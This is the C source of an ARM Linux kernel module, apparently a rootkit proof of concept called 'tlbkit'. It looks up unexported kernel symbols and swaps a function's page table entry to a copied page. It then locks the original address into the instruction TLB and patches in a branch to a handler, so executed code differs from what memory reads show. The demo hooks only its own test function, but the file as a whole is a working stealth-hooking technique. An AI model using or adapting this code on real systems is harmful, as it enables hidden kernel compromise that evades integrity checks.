#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include <linux/vmalloc.h>      // vmalloc
#include <linux/slab.h>         // kmalloc
#include <linux/smp.h>          // smp_processor_id
// #include <linux/pgtable.h>   // set_pte_at NOT EXPORTED
// #include <asm/pgtable.h>     // i forgor ??

#include <asm/proc-fns.h>       // set_pte_ext
#include <asm/ptrace.h>         // struct pt_regs


#include <asm/cacheflush.h>     // flush_cache_mm
// #include <asm/tlbflush.h>    // flush_tlb_all NOT EXPORTED



#include "include/assembler.h"
#include "include/set_page_flags.h"
#include "include/helpers.h"
#include "linux/preempt.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("wintermute");
MODULE_DESCRIPTION("tlbkit");
MODULE_VERSION("0.1");




extern int tlbkit_bad(void);


extern uint32_t tlbkit_read_itlb_lockdown(void);
extern uint32_t tlbkit_get_asid(void);
extern uint32_t tlbkit_read_c1(void);


extern void tlbkit_lockdown_itlb_addr(uint32_t addr);



extern void tlbkit_handler_dispatch(void);
extern void tlbkit_handler_dispatch_reloc(void);
extern void tlbkit_handler_dispatch_reloc_a(void);


void (*tlbkit_set_pte_at)(struct mm_struct *, unsigned long, pte_t *, pte_t) = NULL;
void (*tlbkit_flush_tlb_all)(void) = NULL;

// update if shellcode changed
#define TLBKIT_HOOK_WIDTH         (ARM_INST_WIDTH)

// // register multiple handlers
// typedef void (*tlbkit_hook_handler_t)(struct pt_regs *regs);


void *internal_memcpy(void *dest, void *src, size_t n) {
    char *csrc = (char *) src;
    char *cdest = (char *) dest;
    size_t i = 0;

    for (i = 0; i < n; i++) {
        cdest[i] = csrc[i];
    }
    return dest;
}


// void tlbkit_hook_handler_1(struct pt_regs *regs) {
void tlbkit_hook_handler_1(void) {
    printk(KERN_INFO "tlbkit: LETS FUCKING GOOOOO\n");

    return;
}

void tlbkit_place_highmem_hook(uint32_t addr) {
    printk(KERN_INFO "tlbkit_place_hook: addr: %lx\n", addr);

    // make reloc page writeable
    ptep_flip_write_protect(virt_to_ptep(tlbkit_handler_dispatch));
    flush_cache_all();
    tlbkit_flush_tlb_all();

    uint32_t bad_page__va = vmalloc(PAGE_SIZE); // vmalloc for highmem
    uint32_t bad_page__pa = highmem_virt_to_phys(bad_page__va);
    internal_memcpy(bad_page__va, addr, PAGE_SIZE); // !! slow

    pte_t *orig_page__ptep = virt_to_ptep(addr);
    pte_t orig_page__pte = *orig_page__ptep;
    uint32_t orig_page__pa = highmem_virt_to_phys(addr);

    printk(KERN_INFO "      tlbkit_get_asid: %lx\n", tlbkit_get_asid());
    printk(KERN_INFO "      orig_page: va @%lx, pa @%lx\n", addr, orig_page__pa);
    printk(KERN_INFO "      bad_page: va @%lx, pa @%lx\n", bad_page__va, bad_page__pa);


    preempt_disable();

    set_pte_ext(orig_page__ptep, pte_mkwrite(pfn_pte(bad_page__pa >> PAGE_SHIFT, PAGE_KERNEL_EXEC)),  0);
    flush_cache_all();
    tlbkit_flush_tlb_all();

    printk(KERN_INFO "PRE LOCKDOWN ->  tlbkit_read_itlb_lockdown: %lx, smp_processor_id: %d\n", tlbkit_read_itlb_lockdown(), smp_processor_id());
    tlbkit_lockdown_itlb_addr((uint32_t) addr); // do on all cores ? check smp_processor_id
    printk(KERN_INFO "POST LOCKDOWN -> tlbkit_read_itlb_lockdown: %lx, smp_processor_id: %d\n", tlbkit_read_itlb_lockdown(), smp_processor_id());

    internal_memcpy(tlbkit_handler_dispatch_reloc, addr, TLBKIT_HOOK_WIDTH);

    uint32_t __reloc_a__to_copy = assemble_b((0 - (int32_t) tlbkit_handler_dispatch_reloc_a) + addr + TLBKIT_HOOK_WIDTH); // sign extend imm24 00 -> imm32, make these offsets macros !!
    internal_memcpy(tlbkit_handler_dispatch_reloc_a, &__reloc_a__to_copy, ARM_INST_WIDTH);

    uint32_t __hook__to_copy = assemble_b((0 - (uint32_t) addr) + (uint32_t) tlbkit_handler_dispatch);
    internal_memcpy(addr, &__hook__to_copy, TLBKIT_HOOK_WIDTH);

    set_pte_ext(orig_page__ptep, orig_page__pte, 0);
    flush_cache_all();
    tlbkit_flush_tlb_all();
    // tlbkit_flush_dtlb(); // if flushes icache accidentally, instead flush dtlb, dcache

    preempt_enable();
}


static int __init tlbkit_init(void)
{
    printk(KERN_INFO "tlbkit: module loaded, PAGE_SIZE %lx\n", PAGE_SIZE);
    // printk(KERN_INFO "tlbkit: tlbkit_read_c1: %lx", tlbkit_read_c1());

    init_init_mm_ptr();
    tlbkit_set_pte_at = rk_kallsyms_lookup_name("set_pte_at");
    tlbkit_flush_tlb_all = rk_kallsyms_lookup_name("flush_tlb_all");


    // run read/execute tests pre-hook insertion
    printk(KERN_INFO "tlbkit: PRE-HOOK\n");
    printk(KERN_INFO "          `tlbkit_bad()` returns %d\n", tlbkit_bad());
    printk(KERN_INFO "          `tlbkit_bad()` read returns %lx\n", *((uint32_t *) tlbkit_bad));


    // TODO: COPY PAGE FIRST TO NOT TAMPER WITH ORIGINAL PAGE
    tlbkit_place_highmem_hook(tlbkit_bad);
    printk(KERN_INFO "tlbkit: POST-HOOK\n");
    printk(KERN_INFO "          `tlbkit_bad()` returns %d\n", tlbkit_bad());
    printk(KERN_INFO "          `tlbkit_bad()` read returns %lx\n", *((uint32_t *) tlbkit_bad));

    return 0;
}

static void __exit tlbkit_exit(void)
{
    printk(KERN_INFO "tlbkit: module unloaded\n");
}

module_init(tlbkit_init);
module_exit(tlbkit_exit);
